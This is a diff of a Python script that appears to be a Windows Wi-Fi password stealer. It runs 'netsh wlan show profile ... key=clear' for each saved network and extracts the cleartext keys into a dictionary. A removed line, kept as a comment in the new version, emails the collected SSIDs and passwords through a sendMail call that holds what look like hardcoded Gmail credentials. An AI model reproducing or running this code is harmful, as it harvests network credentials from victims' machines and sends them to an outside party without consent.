@@ -28,26 +28,29 @@ def getWifi():
 
 #print(getWifi())
 def getPass():
-    passwords = []
+    passwords = {}
 
     for network in getWifi():
         #print(network)
         cmd = 'netsh wlan show profile ' + network + ' key=clear'
-        #print(cmd)
         wlanProfile = subprocess.check_output(cmd)
         wlanProfile = wlanProfile.decode()
-        getPass = re.compile(r'(Key Content\s*:)(.*)')
-        reGroups = getPass.findall(wlanProfile)[-1]
-        password = (reGroups[-1])
-        password = password.strip()
-        passwords.append(password)
-    
+        if 'Key Content' in wlanProfile:
+            #print(cmd)
+            #print(wlanProfile)
+            getNet = re.compile(r'SSID name\s*:\s(".*")')
+            getPass = re.compile(r'Key Content\s*:\s(.*)')
+            network = getNet.findall(wlanProfile)
+            password = getPass.findall(wlanProfile)
+            network = network[0].strip()
+            password = password[0].strip()
+            #print(network)
+            #print(password)
+            passwords[network] = password
+            
+            
+
     return passwords
-#print(getPass())
-
-result = zip(getWifi(),getPass())
-result = (list(result))
-
-
-sendMail('benpro4433@gmail.com','burn3rp4ss',result)
+print(getPass())
+#sendMail('benpro4433@gmail.com','burn3rp4ss',result)
 
